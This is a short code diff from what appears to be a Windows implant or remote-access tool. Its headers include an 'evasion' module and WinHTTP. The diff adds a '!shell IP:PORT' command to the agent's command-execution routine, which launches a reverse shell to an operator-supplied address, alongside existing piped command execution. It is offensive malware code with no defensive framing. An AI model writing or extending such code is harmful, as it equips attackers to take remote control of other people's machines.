@@ -2,6 +2,7 @@
 #include "config.hpp"
 #include "utils.hpp"
 #include "evasion.hpp"
+#include "shell.h"               // <--- Reverse shell header
 #include <windows.h>
 #include <winhttp.h>
 #include <string>
@@ -226,11 +227,33 @@ static HttpResponse WinHttpRequest(
 }
 
 // =====================================================================
-//  COMMAND EXECUTION (CreateProcess with pipe)
+//  COMMAND EXECUTION (CreateProcess with pipe + !shell support)
 // =====================================================================
 std::wstring ExecuteCommand(const std::wstring& cmd) {
     DebugLog(L"Executing command: " + cmd);
 
+    // Convert to narrow string for checking
+    std::string cmdStr = WStringToUTF8(cmd);
+
+    // --- Reverse shell command: !shell IP:PORT ---
+    if (cmdStr.rfind("!shell", 0) == 0) {
+        if (cmdStr.length() > 7) {
+            std::string target = cmdStr.substr(7);
+            // Trim leading/trailing spaces
+            size_t start = target.find_first_not_of(" \t");
+            if (start != std::string::npos) {
+                target = target.substr(start);
+                StartReverseShell(target.c_str());
+                return L"[*] Reverse shell launched to " + UTF8ToWString(target);
+            } else {
+                return L"[!] Usage: !shell IP:PORT";
+            }
+        } else {
+            return L"[!] Usage: !shell IP:PORT";
+        }
+    }
+
+    // --- Regular one‑shot command execution ---
     SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE};
     HANDLE hReadPipe = nullptr, hWritePipe = nullptr;
     if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
